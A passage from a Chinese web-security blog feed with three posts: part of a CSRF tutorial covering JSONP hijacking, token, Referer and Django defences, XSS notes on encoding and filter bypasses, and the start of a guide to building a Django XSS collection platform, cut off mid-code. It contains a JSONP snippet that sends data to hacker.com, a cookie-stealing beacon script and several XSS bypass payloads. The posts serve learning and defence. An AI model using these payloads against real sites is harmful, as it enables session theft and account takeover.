id="2-Ajax"><a href="#2-Ajax" class="headerlink" title="2) Ajax"></a>2) Ajax</h3><p>&#160;&#160;&#160;&#160;除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。<br>&#160;&#160;&#160;&#160;关于CORS规则，不清楚的可以去看看<strong>evoA</strong>大佬的一篇文章<a href="https://xz.aliyun.com/t/4470#toc-11">跨域方式及其产生的安全问题</a>。<br>&#160;&#160;&#160;&#160;简单来说就是需要构造的xhr的<code>withCredentials</code>属性也为<code>true</code>才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。<br>&#160;&#160;&#160;&#160;通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。  </p><h2 id="0x05-CSRF利用实例"><a href="#0x05-CSRF利用实例" class="headerlink" title="0x05 CSRF利用实例"></a>0x05 CSRF利用实例</h2><h3 id="1-常用利用方式"><a href="#1-常用利用方式" class="headerlink" title="1) 常用利用方式"></a>1) 常用利用方式</h3><p>&#160;&#160;&#160;&#160;攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。<br><img src="https://img.0x002.com/article/LearnCSRF/5c98c737b44f7.webp" alt=""></p><h3 id="2-结合XSS利用"><a href="#2-结合XSS利用" class="headerlink" title="2) 结合XSS利用"></a>2) 结合XSS利用</h3><p>&#160;&#160;&#160;&#160;CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。  </p><h3 id="3-jsonp"><a href="#3-jsonp" class="headerlink" title="3) jsonp"></a>3) jsonp</h3><p>&#160;&#160;&#160;&#160;我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。<br>&#160;&#160;&#160;&#160;当我们需要调用远程api时json返回的数据一般如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user(&#123;&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......&#125;)</span><br></pre></td></tr></table></figure><br>&#160;&#160;&#160;&#160;这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下<code>&lt;script&gt;</code>标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：<strong>callback</strong>)，就上述例子说，只需要通过下面方法即可调用返回的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function user(data)&#123;</span><br><span class="line">        console.log(data);&#x2F;&#x2F;此时的json数据已经存储进了data变量中    </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><br><img src="https://img.0x002.com/article/LearnCSRF/5c98cf9a343b8.webp" alt=""><br><img src="https://img.0x002.com/article/LearnCSRF/5c98d67b2238c.webp" alt=""><br>&#160;&#160;&#160;&#160;这种远程api接口十分容易受到CSRF攻击，我们可以通过修改<strong>callback</strong>参数值并添加自定义函数，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function jsonphack(data)&#123;</span><br><span class="line">        new image().src&#x3D;&quot;http:&#x2F;&#x2F;hacker.com&#x2F;json.php?data&#x3D;&quot;+escape(data);</span><br><span class="line">        &#x2F;&#x2F;将json返回的数据发送到黑客服务器上</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?callback&#x3D;jsonphack&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="4-更多例子"><a href="#4-更多例子" class="headerlink" title="4) 更多例子"></a>4) 更多例子</h3><p><a href="https://www.freebuf.com/articles/web/55965.html">从零开始学CSRF</a><br><a href="https://xz.aliyun.com/t/1673">Web安全系列 – Csrf漏洞</a><br><a href="https://xz.aliyun.com/t/2384">phpMyAdmin 4.7.x CSRF 漏洞利用</a>  </p><h2 id="0x06-防御CSRF攻击"><a href="#0x06-防御CSRF攻击" class="headerlink" title="0x06 防御CSRF攻击"></a>0x06 防御CSRF攻击</h2><p>&#160;&#160;&#160;&#160;前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。</p><h3 id="1-Token"><a href="#1-Token" class="headerlink" title="1) Token"></a>1) Token</h3><p>&#160;&#160;&#160;&#160;我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？<br>&#160;&#160;&#160;&#160;这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在<strong>hidden</strong>表单或用户的<strong>Cookie</strong>里。<br>&#160;&#160;&#160;&#160;当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、<strong>销毁</strong>原Token以及生成并返回<strong>新</strong>的Token给用户，这样做不仅仅起到了<strong>防御CSRF</strong>的作用，还可以防止<strong>表单的重复提交</strong>。<br>&#160;&#160;&#160;&#160;由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。<br>&#160;&#160;&#160;&#160;注意Token不应该放置在网页的<strong>Url</strong>中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为<strong>Referer</strong>发送给外部服务器，以下为相关实例：  </p><ul><li>WooYun-2015-136903</li></ul><h3 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2) Referer"></a>2) Referer</h3><p>&#160;&#160;&#160;&#160;前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的<strong>Referer值</strong>不同，使用我们可以根据这点来防御CSRF。<br>&#160;&#160;&#160;&#160;在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。<br>&#160;&#160;&#160;&#160;不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。<br>&#160;&#160;&#160;&#160;判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。<br>&#160;&#160;&#160;&#160;比如<code>^http\:\/\/a\.com</code>，只验证了是否Referer是否以<code>http://a.com</code>开头，可是没想到我们可以在自己的顶级域名添加一个子域名<code>http://a.com.hacker.com</code>；还有<code>http\:\/\/a\.com\/</code>，通过<code>http://hacker.com/?http://a.com/</code>绕过。以下相关例子均为Referer绕过：</p><ul><li>WooYun-2015-164067</li><li>WooYun-2015-165578</li><li>WooYun-2016-166608</li><li>WooYun-2016-167674</li></ul><p>&#160;&#160;&#160;&#160;有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。<br><img src="https://img.0x002.com/article/LearnCSRF/5c9a1fd975b72.webp" alt=""></p><h3 id="3-验证码"><a href="#3-验证码" class="headerlink" title="3) 验证码"></a>3) 验证码</h3><p>&#160;&#160;&#160;&#160;在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。  </p><h3 id="4-关注点"><a href="#4-关注点" class="headerlink" title="4) 关注点"></a>4) 关注点</h3><p>&#160;&#160;&#160;&#160;关于CSRF的防护应首先关注高危操作的请求，比如:<strong>网上转账</strong>、<strong>修改密码</strong>等，其次应重点关注那些可以散播的，比如：<strong>分享链接</strong>、<strong>发送消息</strong>等，再者是能辅助散播的，如<strong>取用户好友信息</strong>等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的<strong>特权操作</strong>，如：<strong>上传文件</strong>、<strong>添加管理员</strong>，在许多渗透测试中，便是起初利用这点一撸到底。</p><h3 id="5-防御实例：Django的CSRF防御机制"><a href="#5-防御实例：Django的CSRF防御机制" class="headerlink" title="5) 防御实例：Django的CSRF防御机制"></a>5) 防御实例：Django的CSRF防御机制</h3><p>&#160;&#160;&#160;&#160;新建个Django项目，打开项目下的<strong>settings.py</strong>文件，可以看到这么一行代码：<code>django.middleware.csrf.CsrfViewMiddleware</code><br><img src="https://img.0x002.com/article/LearnCSRF/5c99fa7461ff7.webp" alt=""><br>这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把<code>Debug</code>打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。<br><img src="https://img.0x002.com/article/LearnCSRF/5c99fb81dcc5c.webp" alt=""><br>现在我们往表单上添加CSRF_Token的验证：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&#x2F;login&#x2F;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &#123;% raw %&#125;&#123;&#123;% endraw %&#125;% csrf_token %&#125; &#x2F;&#x2F;添加Token</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pwd&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登陆&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>下图为生成的HTML，可以看到<code>{% csrf_token %}</code>这串代码被Django解析成了一个隐藏的<code>input</code>标签，其中的值为token值，当我们发送请求时必须带上这个值。<br><img src="https://img.0x002.com/article/LearnCSRF/5c99fdf9b1817.webp" alt=""><br>只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。<br><img src="https://img.0x002.com/article/LearnCSRF/5c9a015bb3235.webp" alt=""></p><p>补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：<strong>farmsec</strong>：<br><img src="https://img.0x002.com/article/LearnCSRF/20171228123105-eb36ca20-eb87-1.png" alt=""></p><h2 id="0x07-CSRF的常用检测方法"><a href="#0x07-CSRF的常用检测方法" class="headerlink" title="0x07 CSRF的常用检测方法"></a>0x07 CSRF的常用检测方法</h2><h3 id="1-黑盒"><a href="#1-黑盒" class="headerlink" title="1) 黑盒"></a>1) 黑盒</h3><ul><li>首先肯定确定<strong>是否除Cookie外其他参数均可确定，即：无验证码，无Token等</strong>。</li><li>再者如果发现是<strong>Referer头判断</strong>的话，可以尝试是否可以绕过正则。</li><li>还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。</li><li>最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为<code>eval(window.name)</code>，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。</li></ul><h3 id="2-白盒"><a href="#2-白盒" class="headerlink" title="2) 白盒"></a>2) 白盒</h3><ul><li>查看是否有Token，验证码，Referer等不确定参数判断。</li><li>判断Referer的正则是否安全。</li><li>判断Token返回的位置是否为安全位置。</li><li>判断生成的Token是否足够随机，毫无规律。</li></ul><p><em>从上到下挖掘难度依次递增</em></p><h2 id="0x08-补充说明"><a href="#0x08-补充说明" class="headerlink" title="0x08 补充说明"></a>0x08 补充说明</h2><h3 id="1-HttpOnly"><a href="#1-HttpOnly" class="headerlink" title="1) HttpOnly"></a>1) HttpOnly</h3><p>&#160;&#160;&#160;&#160;CSRF攻击不受Cookie的<strong>HttpOnly</strong>属性影响。<br><img src="https://img.0x002.com/article/LearnCSRF/5c9a0543ebef5.webp" alt=""></p><h3 id="2-XSS漏洞情况下的CSRF"><a href="#2-XSS漏洞情况下的CSRF" class="headerlink" title="2) XSS漏洞情况下的CSRF"></a>2) XSS漏洞情况下的CSRF</h3><p>&#160;&#160;&#160;&#160;如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。</p><h3 id="3-关于Flash的内容"><a href="#3-关于Flash的内容" class="headerlink" title="3) 关于Flash的内容"></a>3) 关于Flash的内容</h3><p>&#160;&#160;&#160;&#160;鉴于Flash的凉势，这里暂不做研究以节省时间。  </p><h3 id="4-目前CSRF形势"><a href="#4-目前CSRF形势" class="headerlink" title="4) 目前CSRF形势"></a>4) 目前CSRF形势</h3><p>&#160;&#160;&#160;&#160;就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。</p><h2 id="0x09-结束语"><a href="#0x09-结束语" class="headerlink" title="0x09 结束语"></a>0x09 结束语</h2><p>&#160;&#160;&#160;&#160;这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。<br>&#160;&#160;&#160;&#160;最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！</p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p>书籍：<br><strong>《Web前端黑客技术揭秘》p83-p96<br>《XSS跨站脚本攻击剖析与防御》p182-p187<br>《黑客攻防技术宝典Web实战篇第二版》p368-p374</strong><br>文章:<br><a href="https://xz.aliyun.com/t/240">CSRF漏洞挖掘</a><br><a href="https://blog.csdn.net/sum_rain/article/details/37085771">WEB安全之Token浅谈</a><br><a href="https://xz.aliyun.com/t/4470">跨域方式及其产生的安全问题</a><br><a href="https://blog.csdn.net/qq_41000891/article/details/82784489">Django中CSRF原理及应用详解</a><br><a href="https://drops.secquan.org/papers/155">CSRF简单介绍及利用方法 | WooYun知识库</a><br><a href="https://blog.csdn.net/liwb94/article/details/80221224">原生JSONP实现_动态加载js（利用script标签）</a></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于我学XSS躺过的那些坑</title>
      <link href="2019/%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/"/>
      <url>2019/%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS字符编码"><a href="#XSS字符编码" class="headerlink" title="XSS字符编码"></a>XSS字符编码</h1><p>在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。</p><h2 id="0x01-Html标签属性中执行"><a href="#0x01-Html标签属性中执行" class="headerlink" title="0x01 Html标签属性中执行"></a>0x01 Html标签属性中执行</h2><p>简单了解：</p><blockquote><p>Html标签属性中的XSS问题多属于javascript伪协议<br>常见的属性有：  </p><ul><li>src</li><li>lowsrc</li><li>dynsrc</li><li>url</li><li>href</li><li>action</li><li>onload</li><li>onunload</li><li>onmouseover</li><li>onerror</li><li>各种on开头的事件  </li></ul></blockquote><blockquote><p>PS：此处可不加括号，如<code>onclick=javascript:alert(1)</code>,各类教程里常见的<code>&lt;img src=javascript:alert(1)&gt;&lt;/img&gt;</code>Chrome、Firfox已失效，IE测试成功。</p></blockquote><p><strong>在Html标签中，许多标签具有执行javascript的权利，当服务器存在过滤时，我们可以尝试通过以下编码方法绕过：</strong></p><ul><li>8/10/16进制转换(<code>[.][&amp;#][&amp;#x]</code>)</li><li>利用<code>javascript:String.fromCharCode(xx,xx,xx......)</code> <strong>[xx为编码的字符串的ASCII码]</strong></li><li>JScript Encode <strong>[IE]</strong>  JS fuck等</li><li><code>data:text/html;bbase64,xxxxxxx</code> <strong>[IE下无效，Chorme、Firefox下均属于空白域，无法获取信息，不过可用作CVE攻击]</strong></li></ul><a id="more"></a><h2 id="0x02-在-lt-script-gt-lt-script-gt-中"><a href="#0x02-在-lt-script-gt-lt-script-gt-中" class="headerlink" title="0x02 在&lt;script&gt;&lt;/script&gt;中"></a>0x02 在&lt;script&gt;&lt;/script&gt;中</h2><blockquote><p>直接在script标签里执行的情况，我们通常分为以下几种利用方式：  </p><ul><li>直接导入远程XSS平台脚本</li><li>直接在<code>&lt;&gt;&lt;/&gt;</code>中写上自定义攻击脚本，如生成img标签</li></ul></blockquote><p>关于<code>&lt;&gt;&lt;/&gt;</code>中可用： </p><h3 id="1-单个拆开编码成ASCII"><a href="#1-单个拆开编码成ASCII" class="headerlink" title="1) 单个拆开编码成ASCII"></a>1) 单个拆开编码成ASCII</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode())</span><br></pre></td></tr></table></figure><h3 id="2-使用eval-执行16进制转换后的代码"><a href="#2-使用eval-执行16进制转换后的代码" class="headerlink" title="2) 使用eval()执行16进制转换后的代码"></a>2) 使用eval()执行16进制转换后的代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(\u0064\u0078......)</span><br><span class="line">eval(\x64\x78......)</span><br></pre></td></tr></table></figure><h2 id="0x03-在样式表中的编码"><a href="#0x03-在样式表中的编码" class="headerlink" title="0x03 在样式表中的编码"></a>0x03 在样式表中的编码</h2><p>样式表中可用expression和@import来执行js代码,此方法可进行适当的编码转换。<br>PS:仅在IE8.0之前的版本。</p><h3 id="1-expression"><a href="#1-expression" class="headerlink" title="1) expression"></a>1) expression</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全角字符：</span><br><span class="line">&lt;div style&#x3D;xss:ｅｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">&lt;div style&#x3D;xss:\0065ｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;注释 [Javascript中也行]</span><br><span class="line">&lt;div sty&#x2F;**&#x2F;le&#x3D;x&#x2F;**&#x2F;ss:\0065ｘｐｒｅ&#x2F;**&#x2F;ｓｓｉｏ&#x2F;**&#x2F;ｎ(al&#x2F;**&#x2F;ert(1))&gt;</span><br></pre></td></tr></table></figure><h3 id="2-import"><a href="#2-import" class="headerlink" title="2) @import"></a>2) @import</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\和结束符\0会被浏览器忽略</span><br><span class="line">@im\po\rt jav\ascr\ipt:al\ert(1)</span><br><span class="line">@im\00po\0rt jav\00asc\0000ript:a\00lert(1)</span><br></pre></td></tr></table></figure><hr><h1 id="浏览器差异"><a href="#浏览器差异" class="headerlink" title="浏览器差异"></a>浏览器差异</h1><p>简单记录常见的浏览器差异造成的XSS  </p><h2 id="0x01-引号的差异"><a href="#0x01-引号的差异" class="headerlink" title="0x01 引号的差异"></a>0x01 引号的差异</h2><p>只有IE支持反引号<code></code> `</p><h2 id="0x02-标签的差异"><a href="#0x02-标签的差异" class="headerlink" title="0x02 标签的差异"></a>0x02 标签的差异</h2><ul><li>data协议执行代码是在Chrome下执行</li><li>Chrome下srcdoc利用：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li><li>IE下<code>&lt;img src=javascript:alert(1)&gt;</code></li><li>只要火狐支持E4X</li></ul><h2 id="0x03-过滤器差异"><a href="#0x03-过滤器差异" class="headerlink" title="0x03 过滤器差异"></a>0x03 过滤器差异</h2><p>Chrome能拦截大多数反射型XSS，Firefox次之，IE最次</p><h1 id="浏览器异常解析BUG产生XSS漏洞"><a href="#浏览器异常解析BUG产生XSS漏洞" class="headerlink" title="浏览器异常解析BUG产生XSS漏洞"></a>浏览器异常解析BUG产生XSS漏洞</h1><p><img src="https://img.0x002.com/article/LearnXSS/5c964e6f476d6.jpg" alt=""></p><h1 id="关于调用document"><a href="#关于调用document" class="headerlink" title="关于调用document"></a>关于调用document</h1><p>在刚开始学习XSS的时候总是想千方百计的想用javascript调用dom对象，比如document.cookie，却不知这个只能在javascript域[伪协议或<script></script>标签内]范围内。</p><h1 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h1><p><strong>一、src等属性在引入时如果漏洞网站协议名于xss平台相同，即可省略去，如：<code>&lt;img src=//www.baidu.com /&gt;</code></strong><br><strong>二、svg标签属于xml而不属于html</strong><br><strong>三、关于Cors跨域：使用Ajax跨域时默认是不允许带上会话数据的，不过可以在XSS平台通过设置返回的请求头<code>Access-Control-Allow-Credentials: true</code>，并且需要设置xhr的<code>withCreadential</code>属性值为true，注意此时返回的<code>Access-Control-Allow-Origin</code>不能设置为通配符true。</strong><br><strong>四、优先级：<code>function xxx()&#123;&#125;形式定义的函数 -&gt; == -&gt; &amp;</code></strong><br><strong>五、使用img等合法标签跨域可以带上会话信息</strong><br><strong>六、除javascript外还有vbscript、actionscript等</strong><br><strong>七、P3P协议仅仅是IE浏览器支持,通常是Hacker域名通过iframe或script等载入存在XSS漏洞的网站</strong>  </p><h1 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h1><p>XSS的恶意请求伪造与CSRF极为相似，两者的差别为：</p><ul><li>后者发出的伪造请求可为其他站点发出的，而前者都是存在XSS漏洞的站点发出的</li><li>CSRF是XSS无法替代的</li><li>CSRF可以无Javascript参与，及在黑客的网站上使用img等标签发送带Cookie(自带)的跨域请求。</li></ul><h1 id="关于XSS防御"><a href="#关于XSS防御" class="headerlink" title="关于XSS防御"></a>关于XSS防御</h1><h2 id="0x01-输出Html标签属性"><a href="#0x01-输出Html标签属性" class="headerlink" title="0x01 输出Html标签属性"></a>0x01 输出Html标签属性</h2><p>如：<code>&lt;input class=&#39;xxx&#39; value=&quot;&#123;输出&#125;&quot;&gt;</code> 这里的输出如果过滤/转义了<code>&quot;</code>，便不存在XSS漏洞了，因为这里的value属性不能执行js代码。   </p><h2 id="0x02-输出在注释"><a href="#0x02-输出在注释" class="headerlink" title="0x02 输出在注释"></a>0x02 输出在注释</h2><p>一定要过滤换行符！！</p><h2 id="0x03-输出在样式表"><a href="#0x03-输出在样式表" class="headerlink" title="0x03 输出在样式表"></a>0x03 输出在样式表</h2><p>过滤expression和@import还有外部图片的引用</p><h2 id="0x04-字符集"><a href="#0x04-字符集" class="headerlink" title="0x04 字符集"></a>0x04 字符集</h2><p>开头设定好字符集为 UTF-8</p><h2 id="0x05-Cookie盗取"><a href="#0x05-Cookie盗取" class="headerlink" title="0x05 Cookie盗取"></a>0x05 Cookie盗取</h2><p>设置好path、开启http_only、防止调试信息泄露和Apache400漏洞、使用Session</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> 个人笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Django简单编写一个XSS平台</title>
      <link href="2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"/>
      <url>2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简要描述"><a href="#1-简要描述" class="headerlink" title="1) 简要描述"></a>1) 简要描述</h1><p>&#160; &#160; &#160; &#160;原理十分简单2333,代码呆萌,大牛勿喷 &gt;_&lt;<br><a id="more"></a></p><h1 id="2-基础知识"><a href="#2-基础知识" class="headerlink" title="2) 基础知识"></a>2) 基础知识</h1><ul><li>XSS攻击基本原理和利用方法</li><li>Django框架的使用</li></ul><!-- more --><h1 id="3-Let’s-start"><a href="#3-Let’s-start" class="headerlink" title="3) Let’s start"></a>3) Let’s start</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>&#160; &#160; &#160; &#160;工欲善其事必先利其器，首先我们需要准备编写代码的各种工具和环境，这里不细说。我这里的环境和工具如下：</p><ul><li>python 3.7.0</li><li>pycharm</li><li>windows 10</li><li>mysql 8.0.15</li><li>Django 2.1.3  </li></ul><p>&#160; &#160; &#160; &#160;需要用到的第三方库：</p><ul><li>django</li><li>pymysql</li><li>requests</li></ul><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>&#160; &#160; &#160; &#160;我们先看一下XSS脚本是如何工作的  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var website&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&quot;;</span><br><span class="line">(function()&#123;(new Image()).src&#x3D;website+&#39;&#x2F;?keepsession&#x3D;1&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;这段代码非常简单，就是通过javascript获取有用信息，然后通过访问xss平台将信息作为GET参数传给服务器。<br>&#160; &#160; &#160; &#160;注意：这里使用AJAX可能会出现CORS跨域问题。  </p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>&#160; &#160; &#160; &#160;先给出关键代码，其他都是Django相关的内容，这里不做相关讨论。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span 